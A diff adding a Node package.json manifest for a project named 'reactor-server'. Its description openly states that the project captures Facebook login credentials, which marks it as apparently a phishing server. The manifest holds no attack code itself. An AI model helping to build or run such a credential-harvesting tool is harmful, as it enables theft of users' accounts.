@@ -1,0 +1,21 @@
+{
+  "name": "reactor-server",
+  "version": "1.0.0",
+  "description": "Capture Facebook login credentials using Node, Vite, and React.",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "dev": "nodemon server.js"
+  },
+  "keywords": [],
+  "author": "Alex Pariah",
+  "license": "MIT",
+  "dependencies": {
+    "cors": "^2.8.5",
+    "express": "^4.18.2"
+  },
+  "devDependencies": {
+    "http-proxy-middleware": "^2.0.6",
+    "nodemon": "^3.1.0"
+  }
+}
